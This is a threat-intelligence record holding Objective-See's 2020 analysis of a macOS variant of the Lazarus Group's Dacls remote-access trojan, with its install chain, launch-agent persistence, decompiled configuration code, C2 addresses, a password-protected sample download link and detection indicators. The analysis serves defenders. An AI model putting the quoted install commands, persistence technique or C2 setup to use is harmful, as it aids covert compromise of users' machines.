{
    "id": "790f1a7d-fd25-4dc6-8c6c-43b8e0166a82",
    "created_at": "2023-01-12T15:10:59.268795Z",
    "updated_at": "2025-03-27T02:17:23.725107Z",
    "deleted_at": null,
    "sha1_hash": "2a009d600f2806f32a0034171f6fec7e4d27a093",
    "title": "2020-05-05 - The Dacls RAT ...now on macOS! deconstructing the mac variant of a lazarus group implant",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:18Z",
    "file_modification_date": "2022-05-29T01:23:18Z",
    "file_size": 4690912,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x57.html**\n\nThe Dacls RAT ...now on macOS!\n\ndeconstructing the mac variant of a lazarus group implant.\n\nby: Patrick Wardle / May 5, 2020\n\nOur research, tools, and writing, are supported by the \"Friends of Objective-See\" such as:\n\n[CleanMyMac X](https://macpaw.com/cleanmymac)\n\nMalwarebytes\nAiro AV\n\n[Become a Friend!](https://objective-see.com/friends.html)\nüìù üëæ Want to play along?\n[I‚Äôve added the sample (‚ÄòOSX.Dacls‚Äô) to our malware collection (password: infect3d)](https://objective-see.com/downloads/malware/Dacls.zip)\n\n‚Ä¶please don‚Äôt infect yourself!\n\n## Background\n\n[Early today, the noted Mac Security researcher Phil Stokes tweeted about a ‚ÄúSuspected](https://twitter.com/philofishal)\n_#Lazarus backdoor/RAT‚Äù:_\n\n1. 899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53\n\n2. 846d8647d27a0d729df40b13a644f3bffdc95f6d0e600f2195c85628d59f1dc6\n\n[‚Äî Phil Stokes ÔøΩüê†ÔøΩ (@philofishal) May 5, 2020](https://twitter.com/philofishal/status/1257678141801332736?ref_src=twsrc%5Etfw)\n\nIn his tweet he noted various details about the malware and was kind enough to post hashes\n[as well. Mahalo Phil (and Thomas Reed, who initially noticed the sample on VirusTotal)! üôè](https://twitter.com/thomasareed/)\n\n[üìù Update: The sample was originally discovered by Hossein Jazi of](https://twitter.com/hadianjazi) [MalwareBytes.](https://www.malwarebytes.com/)\n\n[MalwareBytes has now published their detailed analysis:](https://www.malwarebytes.com/)\n\n\n-----\n\n[New Mac variant of Lazarus Dacls RAT distributed via Trojanized 2FA app](https://blog.malwarebytes.com/threat-analysis/2020/05/new-mac-variant-of-lazarus-dacls-rat-distributed-via-trojanized-2fa-app/)\n[As noted in his tweet, current detections for both the malware‚Äôs disk image and](https://www.virustotal.com/gui/file/899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53/detection) [payload are](https://www.virustotal.com/gui/file/846d8647d27a0d729df40b13a644f3bffdc95f6d0e600f2195c85628d59f1dc6/detection)\nat 0% (though this is likely to change as AV engines update the signature databases):\n\nThe Lazarus APT group (North Korea) is arguably to most prevalent (or perhaps just visible)\nAPT group in the macOS space. In fact the majority of my recent macOS malware blogs\nhave been about their creations:\n\n[‚ÄúOSX.Yort‚Äù](https://objective-see.com/blog/blog_0x53.html#osx-yort)\n\n[‚ÄúPass the AppleJeus‚Äù](https://objective-see.com/blog/blog_0x49.html)\n\n[‚ÄúLazarus Group Goes ‚ÄòFileless‚Äô‚Äù](https://objective-see.com/blog/blog_0x51.html)\n\nThough not remarkably sophisticated, they continue to evolve and improve their tradecraft.\n\nüìù For more details on the Lazarus APT group, and their recent advancements, see\n\n[\"North Korean hackers getting more careful, targeted in financial hacks\"](https://www.cyberscoop.com/kaspersky-lazarus-group-north-korean-hackers-targeted-financial/)\nIn this blog post, we deconstruct the their macOS latest creation (a variant of the `Dacls`\nRAT), highlighting its install logic, persistence mechanism, and capabilities! We‚Äôll also\nhighlights IOCs and generic methods of detection.\n\n\n-----\n\n## Installation\n\nCurrently (at least to me), it is unknown how the Lazarus actors remotely infect macOS\nsystems with this specimen ( OSX.Dacls ). However as our analysis will show, the way the\nmalware is packaged closely mimics Lazarus group‚Äôs other attacks ‚Ä¶which relied on social\nengineering efforts. Specifically, coercing macOS users to download and run trojanized\napplications:\n\nThanks to Phil‚Äôs tweet and hashes, we can find a copy of the attackers‚Äô Apple Disk Image\n( TinkaOTP.dmg ) on [VirusTotal.](https://www.virustotal.com/gui/file/899e66ede95686a06394f707dd09b7c29af68f95d22136f0a023bfd01390ad53/)\n\nTo extract the embedded files stored on the `TinkaOTP.dmg we mount it via the` `hdiutil`\ncommand:\n```\n$ hdiutil attach TinkaOTP.dmg \n/dev/disk3      GUID_partition_scheme      \n/dev/disk3s1     Apple_HFS            /Volumes/TinkaOTP\n\n```\n‚Ä¶which mounts it to `/Volumes/TinkaOTP .`\n\nListing the files in the `TinkaOTP directory reveals an application ( TinkaOTP.app ) and an`\n(uninteresting) `.DS_Store file:`\n```\n$ ls -lart /Volumes/TinkaOTP/\ndrwxr-xr-x 3 patrick staff  102 Apr 1 16:11 TinkaOTP.app\n-rw-r--r--@ 1 patrick staff 6148 Apr 1 16:15 .DS_Store\n\n```\nBoth appear to have a creation timestamp of April 1st.\n\nThe application, `TinkaOTP.app is signed ‚Äúadhoc-ly‚Äù (as the Lazarus group often does):`\n\n\n-----\n\n```\n$ codesign dvvv /Volumes/TinkaOTP/TinkaOTP.app \nExecutable=/Volumes/TinkaOTP/TinkaOTP.app/Contents/MacOS/TinkaOTP\nIdentifier=com.TinkaOTP\nFormat=app bundle with Mach-O thin (x86_64)\nCodeDirectory v=20100 size=5629 flags=0x2(adhoc) hashes=169+5 location=embedded\nHash type=sha256 size=32\nCandidateCDHash sha1=8bd4b789e325649bafcc23f70bae0d1b915b67dc\nCandidateCDHashFull sha1=8bd4b789e325649bafcc23f70bae0d1b915b67dc\nCandidateCDHash sha256=4f3367208a1a6eebc890d020eeffb9ebf43138f2\nCandidateCDHashFull\nsha256=4f3367208a1a6eebc890d020eeffb9ebf43138f298580293df2851eb0c6be1aa\nHash choices=sha1,sha256\nCMSDigest=08dd7e9fb1551c8d893fac2193d8c4969a9bc08d4b7b79c4870263abaae8917d\nCMSDigestType=2\nCDHash=4f3367208a1a6eebc890d020eeffb9ebf43138f2\nSignature=adhoc\nInfo.plist entries=24\nTeamIdentifier=not set\nSealed Resources version=2 rules=13 files=15\nInternal requirements count=0 size=12\n\n```\nThis also means that on modern versions of macOS (unless some exploit is first used to gain\ncode execution on the target system), the application will not (easily) run:\n\nüìù Jumping a bit ahead of ourselves, a report on the Windows/Linux version of this malware\nnoted that it was uncovered along with a \"working payload for Confluence CVE-2019-3396\"\nand that researchers, \"speculated that the Lazarus Group used the CVE-2019-3396 N-day\nvulnerability to spread the Dacls Bot program.\"\n‚Ä¶so, it is conceivable that macOS users were targeted by this (or similar) exploits.\n\nSource: [Dacls, the Dual platform RAT.](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/)\n```\nTinkaOTP.app is a standard macOS application:\n\n```\n\n-----\n\nExamining its `Info.plist file, illustrates that application‚Äôs binary (as specified in the`\n```\nCFBundleExecutable key), is (unsurprisingly) named TinkaOTP :\n$ defaults read /Volumes/TinkaOTP/TinkaOTP.app/Contents/Info.plist \n{\n  BuildMachineOSBuild = 19E266;\n  CFBundleDevelopmentRegion = en;\n  CFBundleExecutable = TinkaOTP;\n  CFBundleIconFile = AppIcon;\n  CFBundleIconName = AppIcon;\n  CFBundleIdentifier = \"com.TinkaOTP\";\n  CFBundleInfoDictionaryVersion = \"6.0\";\n  CFBundleName = TinkaOTP;\n  CFBundlePackageType = APPL;\n  CFBundleShortVersionString = \"1.2.1\";\n  CFBundleSupportedPlatforms =   (\n    MacOSX\n  );\n  CFBundleVersion = 1;\n  DTCompiler = \"com.apple.compilers.llvm.clang.1_0\";\n  DTPlatformBuild = 11B52;\n  DTPlatformVersion = GM;\n  DTSDKBuild = 19B81;\n  DTSDKName = \"macosx10.15\";\n  DTXcode = 1120;\n  DTXcodeBuild = 11B52;\n  LSMinimumSystemVersion = \"10.10\";\n  LSUIElement = 1;\n  NSHumanReadableCopyright = \"Copyright \\\\U00a9 2020 TinkaOTP. All rights\nreserved.\";\n  NSMainNibFile = MainMenu;\n  NSPrincipalClass = NSApplication;\n}\n\n```\n\n-----\n\nAs the value for the `LSMinimumSystemVersion key is set to` `10.10` the malicious\napplication will execute on macOS systems all the way back to `OS X Yosemite .`\n\nNow, let‚Äôs take a closer look at the `TinkaOTP binary (which will be executed if the user`\n(successfully) launches the application). As expected, it‚Äôs a 64-bit Mach-O binary:\n```\n$ file TinkaOTP.app/Contents/MacOS/TinkaOTP \nTinkaOTP.app/Contents/MacOS/TinkaOTP: Mach-O 64-bit executable x86_64\n\n```\nBefore hopping into a disassembler or debugger, I like to just run the malware is a virtual\nmachine (VM), and observe its actions via process, file, and network. This can often shed\nvaluable insight into the malware actions and capabilities, which in turn can guide further\nanalysis focus.\n\nüìù I've written several monitor tools to facilitate such analysis:\n\n[ProcessMonitor](https://objective-see.com/products/utilities.html#ProcessMonitor)\n\n[FileMonitor](https://objective-see.com/products/utilities.html#FileMonitor)\n\n[Netiquette](https://objective-see.com/products/netiquette.html)\n\nFiring up these analysis tools, and running `TinkaOTP.app quickly reveals its installation`\n[logic. Specifically the ProcessMonitor records the following:](https://objective-see.com/products/utilities.html#ProcessMonitor)\n\n\n-----\n\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"signing info (computed)\" : {\n   \"signatureID\" : \"com.apple.cp\",\n   \"signatureStatus\" : 0,\n   \"signatureSigner\" : \"Apple\",\n   \"signatureAuthorities\" : [\n    \"Software Signing\",\n    \"Apple Code Signing Certification Authority\",\n    \"Apple Root CA\"\n   ]\n  },\n  \"uid\" : 501,\n  \"arguments\" : [\n   \"cp\",\n   \"/Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib\",\n   \"/Users/user/Library/.mina\"\n  ],\n  \"ppid\" : 863,\n  \"ancestors\" : [\n   863\n  ],\n  \"path\" : \"/bin/cp\",\n  \"signing info (reported)\" : {\n   \"teamID\" : \"(null)\",\n   \"csFlags\" : 603996161,\n   \"signingID\" : \"com.apple.cp\",\n   \"platformBinary\" : 1,\n   \"cdHash\" : \"D2E8BBC6DB07E2C468674F829A3991D72AA196FD\"\n  },\n  \"pid\" : 864\n },\n \"timestamp\" : \"2020-05-06 00:16:52 +0000\"\n}\n\n```\nThis output shows `bash being spawned by` `TinkaOTP.app with the following arguments:`\n```\n   cp\n   /Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib\n   /Users/user/Library/.mina\n\n```\n‚Ä¶in other words, the malware is copying the `Base.lproj/SubMenu.nib file (from the`\napplication‚Äôs `Resources directory) to the user‚Äôs` `Library directory (as the ‚Äúhidden‚Äù file:`\n```\n.mina ).\n\n```\nThe process monitor then shows `TinkaOTP.app setting the executable bit on the` `.mina`\nfile (via `chmod +x /Users/user/Library/.mina ), before executing it:`\n\n\n-----\n\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"signing info (computed)\" : {\n   \"signatureStatus\" : -67062\n  },\n  \"uid\" : 501,\n  \"arguments\" : [\n   \"/Users/user/Library/.mina\"\n  ],\n  \"ppid\" : 863,\n  \"ancestors\" : [\n   863\n  ],\n  \"path\" : \"/Users/user/Library/.mina\",\n  \"signing info (reported)\" : {\n   \"teamID\" : \"(null)\",\n   \"csFlags\" : 0,\n   \"signingID\" : \"(null)\",\n   \"platformBinary\" : 0,\n   \"cdHash\" : \"0000000000000000000000000000000000000000\"\n  },\n  \"pid\" : 866\n },\n \"timestamp\" : \"2020-05-06 00:16:53 +0000\"\n}\n\n```\nA partial sequence of these commands is hardcoded directly in the `TinkaOTP.app ‚Äôs binary:`\n\n[Hopping into a disassembler (I use Hopper), we can track down code (invoked via the](https://www.hopperapp.com/)\n```\napplicationDidFinishLaunching method), responsible for executing said command:\n 1;TinkaOTP.AppDelegate.applicationDidFinishLaunching(Foundation.Notification) \n 2\n 3r13 = *direct field offset for TinkaOTP.AppDelegate.btask : __C.NSTask;\n 4rdx = __C.NSString(0x7361622f6e69622f, 0xe900000000000068);\n 5\n 6...\n 7\n 8[r15 setLaunchPath:rdx];\n 9\n10...\n11\n12[r15 setArguments:...];\n13\n14[*(var_30 + var_68) launch];\n\n```\n\n-----\n\nThe decompilation is rather ugly (as `TinkaOTP.app is written in Swift), but in short the`\nmalware is invoking the installation commands ( cp ... ) via Apple‚Äôs `NSTask API.`\n\nWe can confirm this via a debugger ( lldb ), by setting a breakpoint on the call to `[NSTask`\n```\nlaunch] (at address 0x10001e30b ) and querying the NSTask object to view its launch\n\n```\npath, and arguments:\n```\n(lldb) b 0x000000010001e30b\nBreakpoint 6: where = TinkaOTP`TinkaOTP.AppDelegate.applicationDidFinishLaunching\n(lldb) c\nProcess 899 resuming\nProcess 899 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 6.1\n(lldb) po $rdi\n(lldb) po [$rdi arguments]\n(\n -c,\n cp /Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib \n ~/Library/.mina > /dev/null 2>&1 && chmod +x ~/Library/.mina > /dev/null 2>&1 && \n ~/Library/.mina > /dev/null 2>&1\n)\n(lldb) po [$rdi launchPath]\n/bin/bash\n\n## Persistence\n\n```\nWe now turn our attention to `SubMenu.nib, which was installed as` `~/Library/.mina .`\n\nIt‚Äôs a standard Mach-O executable:\n```\n$ file TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib \nTinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib: Mach-O 64-bit executable\nx86_64\n\n```\nAs there turned out to be a bug in the code (ha!), we‚Äôre going to start our analysis in the\ndisassembler at the malware‚Äôs `main function. First we noted a (basic) anti-`\ndisassembly/obfuscation technique, where strings are dynamically built manually (via hex\nconstants):\n\n\n-----\n\nIn Hopper, via `Shift+R we can covert the hex to ascii:`\n\n‚Ä¶which reveals a path: `/Library/LaunchAgents/com.aex.lop.agent.plist`\n\nHowever, the malware author(s) also left this string directly embedded in the binary:\n\n\n-----\n\nWithin the disassembly of the `main function, we also find an embedded property list:`\n\nSeems reasonable to assume that the malware will persist itself as a launch agent. And in\nfact, it tries to! However, if the `~/Library/LaunchAgent directory does not exists (which it`\ndoes not on default install of macOS), the persistence will fail.\n\nSpecifically, the malware invokes the `fopen function (with the` `+w option) on`\n```\n/Library/LaunchAgents/com.aex.lop.agent.plist ‚Ä¶which will error out if any\n\n```\ndirectories in the path don‚Äôt exist.\n\nThis can be confirmed in a debugger:\n\n\n-----\n\n```\n$ lldb /Library/.mina\n//break at the call to fopen()\n(lldb) 0x10000b6e8\n(lldb) c\nProcess 920 stopped\n.mina`main:\n-> 0x10000b6e8 : callq 0x100078f66        ; symbol stub for: fopen\n  0x10000b6ed : testq %rax, %rax\n  0x10000b6f0 : je   0x10000b711        ; \n  0x10000b6f2 : movq  %rax, %rbx\nTarget 0: (.mina) stopped.\n//print arg_0\n// this is the path\n(lldb) x/s $rdi\n0x7ffeefbff870: \"/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist\"\n//step over call\n(lldb) ni\n//fopen() fails\n(lldb) reg read $rax\nrax = 0x0000000000000000\n\n```\n‚Ä¶I guess writing malware can be tough! :P\n\nIf we manually create the `~/Library/LaunchAgent directory, the call to` `fopen succeeds`\nand the malware will happily persist. Specifically, it formats the embedded property list\n(dynamically adding in the path to itself), which is then written out to `com.aex-`\n```\nloop.agent.plist :\n\n```\n\n-----\n\n```\n$ lldb /Library/.mina\n(lldb) 0x100078f72\n(lldb) c\nProcess 930 stopped\n.mina`main:\n-> 0x10000b704 : callq 0x100078f72        ; symbol stub for: fprintf\n  0x10000b709 : movq  %rbx, %rdi\n  0x10000b70c : callq 0x100078f4e        ; symbol stub for: fclose\n  0x10000b711 : movq  %r12, %rdi\nTarget 0: (.mina) stopped.\n//print arg_1\n// this is the format string\n(lldb) x/s $rsi\n0x10007da69: \"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\r\\n<!DOCTYPE plist PUBLIC\n\"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList1.0.dtd\">\\r\\n<plist\nversion=\"1.0\">\\r\\n<dict>\\r\\n\\t<key>Label</key>\\r\\n\\t<string>com.aexloop.agent</string>\\r\\n\\t<key>ProgramArguments</key>\\r\\n\\t<array>\\r\\n\\t\\t<string>%s</s\n//print arg_2\n// this is the format data (path to self)\n(lldb) x/s $rdx\n0x101000000: \"/Users/user/Library/.mina\"\n\n```\nOur `FileMonitor passively observers this:`\n\n\n-----\n\n```\n# FileMonitor/Contents/MacOS/FileMonitor pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"file\" : {\n  \"destination\" : \"/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist\",\n  \"process\" : {\n   \"signing info (computed)\" : {\n    \"signatureStatus\" : -67062\n   },\n   \"uid\" : 501,\n   \"arguments\" : [\n   ],\n   \"ppid\" : 932,\n   \"ancestors\" : [\n    932,\n    909,\n    905,\n    904,\n    820,\n    1\n   ],\n   \"path\" : \"/Users/user/Library/.mina\",\n   \"signing info (reported)\" : {\n    \"teamID\" : \"(null)\",\n    \"csFlags\" : 0,\n    \"signingID\" : \"(null)\",\n    \"platformBinary\" : 0,\n    \"cdHash\" : \"0000000000000000000000000000000000000000\"\n   },\n   \"pid\" : 931\n  }\n },\n \"timestamp\" : \"2020-05-06 01:14:18 +0000\"\n}\n\n```\nAs the value for the `RunAtLoad key is set to` `true the malware will be automatically`\n(re)started by macOS each time the system is rebooted (and the user logs in).\n\nüìù If the malware finds itself running with root privileges it will persist to:\n\n/Library/LaunchDaemons/com.aex-loop.agent.plist\nOk, so now we understand how the malware persists, let‚Äôs briefly discuss its capabilities.\n\n## Capabilities\n\nSo far we know that the trojanized `TinkaOTP.app installs a binary to` `~/Library/.mina,`\nand persists it as a launch item.\n\n‚Ä¶but what does `.mina actually do? The good news (for me as a somewhat lazy malware`\nanalyst), is that this has already be answered!\n\n\n-----\n\nRunning the `strings command on the` `.mina binary reveals some interesting, well,`\nstrings:\n```\n$ strings -a ~/Library/.mina\nc_2910.cls\nk_3872.cls\nhttp:/\nPOST /%s HTTP/1.0\nHost: %s\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/65.0.3325.181 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n/Library/Caches/com.apple.appstore.db\n/proc\n/proc/%d/task\n/proc/%d/cmdline\n/proc/%d/status\nwolfCrypt Operation Pending (would block / eagain) error\nwolfCrypt operation not pending error\n\n```\nWhen analyzing an unknown malicious piece of software it‚Äôs (generally) a good idea to\nGoogle interesting strings, as this can turn up related files, or even better, previous analysis\nreports. Here we luck out, as the latter holds!\n\n\n-----\n\nThe `c_2910.cls string matches on a report for a Lazarus Group cross-platform RAT`\nnamed `Dacls ‚Ä¶and as we‚Äôll see other strings, and functionality (as well as input by other`\nsecurity researchers) confirm this.\n\n[üìù The noted Mac Malware Analyst Thomas Reed, is (AFAIK) the first to identify this](https://twitter.com/thomasareed/)\nspecimen, and note that it was a ‚ÄúMac variant of Dacls RAT‚Äù\n\nThe initial report on the `Dacls RAT, was published in December 2019, by Netlab. Titled,`\n[‚ÄúDacls, the Dual platform RAT‚Äù, it comprehensively covers both the Windows and Linux](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/)\nvariants of this RAT (as well as notes, ‚Äúwe speculate that the attacker behind Dacls RAT is\n_Lazarus Group‚Äù)._\n\n‚Ä¶however there is no mention of a macOS variant! As such, this specimen appears to be\nthe first macOS variant of `Dacls (and thus also, this post, the first analysis)!`\n\nAs noted, the Netlab [report provides a thorough analysis of the RATs capabilities on](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/)\nWindows/Linux. As such, we won‚Äôt duplicate said analysis, but instead will confirm that this\nspecimen is indeed a macOS variant of `Dacls, as well as note a few macOS-specific`\nnuances/IOCs.\n\nLooking at the disassembly of the malware‚Äôs `main function, after the malware persists, it`\ninvokes a function named `InitializeConfiguration :`\n\n\n-----\n\n```\n 1int InitializeConfiguration() {\n 2 rax = time(&var_18);\n 3 srand(rax);\n 4 if (LoadConfig(_g_mConfig) != 0x0) \n 5 {\n 6  __bzero(_g_mConfig, 0x8e14);\n 7  rax = rand();\n 8\n 9  *(int32_t *)_g_mConfig = ((SAR((sign_extend_32(rax) * 0xffffffff80000081 >>\n0x20) \n10  + sign_extend_32(rax), 0x17)) + ((sign_extend_32(rax) * 0xffffffff80000081 >>\n0x20) \n11  + sign_extend_32(rax) >> 0x1f) - ((SAR((sign_extend_32(rax) *\n0xffffffff80000081 >> 0x20) \n12  + sign_extend_32(rax), 0x17)) + ((sign_extend_32(rax) * 0xffffffff80000081 >>\n0x20) \n13  + sign_extend_32(rax) >> 0x1f) << 0x18)) + sign_extend_32(rax);\n14\n15  *0x10009c3c8 = 0x1343b8400030100;\n16  *(int32_t *)dword_10009c42c = 0x3;\n17\n18  mata_wcscpy(0x10009c430, u\"67.43.239.146:443\");\n19  mata_wcscpy(0x10009cc30, u\"185.62.58.207:443\");\n20  mata_wcscpy(0x10009d430, u\"185.62.58.207:443\");\n21  *(int32_t *)0x10009c3d0 = 0x2;\n22  rax = SaveConfig(_g_mConfig);\n23\n24 }\n25 else {\n26     rax = 0x0;\n27 }\n28 return rax;\n29}\n\n```\nAfter seeding the random number generator, the malware invokes a function named\n```\nLoadConfig . In short, the LoadConfig function attempts to load a configuration file from\n/Library/Caches/com.apple.appstore.db . If found, it decrypts the configuration via a\n\n```\ncall to the `AES_CBC_decrypt_buffer function. If the configuration is not found, it returns a`\nnon-zero error.\n\nLooking at the code in `InitializeConfiguration we can see that if` `LoadConfig fails`\n(i.e. no configuration file is found), code within `InitializeConfiguration will generate a`\ndefault configuration, which is then saved via a call to the `SaveConfig function.`\n\nWe can see three IP addresses (two unique) that are part of the default configuration:\n```\n67.43.239.146 and 185.62.58.207 . These as the default command & control servers.\n\n```\n[Returning to the Netlab report, it states:](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/)\n\n\n-----\n\n_The Linux.Dacls Bot configuration file is stored at $HOME/.memcache, and the file_\n_content is 0x8E20 + 4 bytes. If Bot cannot find the configuration file after startup, it will_\n_use AES encryption to generate the default configuration file based on the hard-coded_\n_information in the sample. After successful Bot communicates with C2, the_\n_configuration file will get updated.‚Äù_\n\nIt appears the macOS variant of `Dacls contains this same logic (albiet the config file is`\nstored in `/Library/Caches/com.apple.appstore.db ).`\n\nThe Netlab researchers also breakdown the format of the configuration file (image credit:\nNetlab):\n\nDoes our macOS variant conform to this format? Yes it appears so:\n\n\n-----\n\n```\n(lldb) x/i $pc\n-> 0x100004c4c: callq 0x100004e20 ; SaveConfig(tagMATA_CONFIG*)\n(lldb) x/192xb $rdi\n0x10009c3c4: 0xcc 0x37 0x86 0x00 0x00 0x01 0x03 0x00\n0x10009c3cc: 0x84 0x3b 0x34 0x01 0x02 0x00 0x00 0x00\n0x10009c3d4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c3dc: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c3e4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c3ec: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c3f4: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c3fc: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c404: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c40c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c414: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c41c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c424: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c42c: 0x03 0x00 0x00 0x00 0x36 0x00 0x37 0x00\n0x10009c434: 0x2e 0x00 0x34 0x00 0x33 0x00 0x2e 0x00\n0x10009c43c: 0x32 0x00 0x33 0x00 0x39 0x00 0x2e 0x00\n0x10009c444: 0x31 0x00 0x34 0x00 0x36 0x00 0x3a 0x00\n0x10009c44c: 0x34 0x00 0x34 0x00 0x33 0x00 0x00 0x00\n0x10009c454: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c45c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c464: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c46c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c474: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n0x10009c47c: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00\n\n```\nThis means we can also extract the (build?) date from the default configuration (offset 0x8):\n```\n0x84 0x3b 0x34 0x01 ‚Ä¶which converts to 0x01343b84 -> 20200324d (March 24th,\n\n```\n2020).\n\nThe Netlab [report also highlights the fact that](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/) `Dacls utilizes a modular plugin architecture:`\n\n‚Äú[Dacls] uses static compilation to compile the plug-in and Bot code together. By\n_sending different instructions to call different plug-ins, various tasks can be completed.‚Äù_\n\n‚Ä¶the report describes various plugins such as a file plugin, a process plugin, a test plugin, a\n‚Äúreverse P2P‚Äù plugin, and a ‚ÄúLogSend‚Äù plugin. The macOS variant of `Dacls supports these`\nplugins (and perhaps an addition one or two, i.e. SOCKS):\n\n\n-----\n\nAt this point, we can readily conclude that the specimen we‚Äôre analyzing is clearly a macOS\nvariant of the `Dacls implant. Preliminary analysis and similarity to the Linux variant`\nindicates this affords remote attackers the ability to fully control an infected system, and the\nimplant supports the ability to:\n\nexecute system commands\nupload/download, read/write, delete files\nlisting, creating, terminating processes\nnetwork scanning\n\n‚ÄúThe main functions of ‚Ä¶Dacls Bot include: command execution, file management,\n_process management, test network access, C2 connection agent, network scanning_\n_module.‚Äù -Netlab_\n\n## Detection\n\nThough `OSX.Dacls is rather feature complete, it is trivial to detect via behavior-based tools`\n‚Ä¶such as the [free ones, created by yours truly!](https://objective-see.com/products.html)\n\n[For example, BlockBlock readily detects the malware‚Äôs launch item persistence:](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\n[While LuLu detects the malware‚Äôs unauthorized network communications to the attackers‚Äô](https://objective-see.com/products/lulu.html)\nremote command & control server:\n\nFinally, [KnockKnock can generically detect if a macOS system is infected with](https://objective-see.com/products/knockknock.html) `OSX.Dacls,`\nby detecting it‚Äôs launch item persistence:\n\n\n-----\n\nTo manually detect `OSX.Dacls look for the presence of the following files:`\n```\n   ~/Library/LaunchAgents/com.aex.lop.agent.plist\n   /Library/LaunchDaemons/com.aex.lop.agent.plist\n   /Library/Caches/com.apple.appstore.db\n   ~/Library/.mina\n\n```\nIf you system is infected, as the malware provide complete command and control over an\ninfected system, best to assume your 100% owned, and fully reinstall macOS!\n\n## Conclusion\n\nToday, we analyzed the macOS variant of `OSX.Dacls, highlighting its installation logic,`\npersistence mechanisms, and capabilities (noting the clear similarities to its Linux-version).\n\nThough it can be somewhat worrisome to see APT groups developing and evolving their\n[macOS capabilities, our free security tools can help thwart these threats ‚Ä¶even with no a](https://objective-see.com/products.html)\npriori knowledge! üõ† üòá\n\n‚ù§ Love these blog posts and/or want to support my research and tools?\n[You can support them via my Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-05 - The Dacls RAT ...now on macOS! deconstructing the mac variant of a lazarus group implant.pdf"
    ],
    "report_names": [
        "2020-05-05 - The Dacls RAT ...now on macOS! deconstructing the mac variant of a lazarus group implant.pdf"
    ],
    "threat_actors": [
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
